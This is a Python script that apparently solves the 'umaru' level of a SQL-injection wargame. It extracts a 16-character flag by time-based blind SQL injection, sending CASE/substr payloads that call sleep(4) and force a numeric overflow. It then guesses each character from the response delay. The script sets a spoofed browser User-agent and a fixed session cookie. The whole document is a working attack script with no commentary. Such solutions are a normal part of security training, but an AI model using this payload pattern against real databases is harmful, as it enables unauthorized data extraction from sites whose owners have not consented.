import urllib.request
from urllib.parse import quote
import time

url = "http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag="
key = ""
len=16

for i in range(1, len+1):
    for j in range(48, 127):
        data = "(case(substr(flag from {} for 1)) when '{}' then ((sleep(4)+2)*9e307) else 9e307*2 end)".format(str(i), chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=tb8r272e7i0jfhbeb522klmbm0")
        st = time.time()
        res = urllib.request.urlopen(re)
        et = time.time()

        if et-st > 4:
            key += chr(j).lower()
            print (key)
            break
print (key)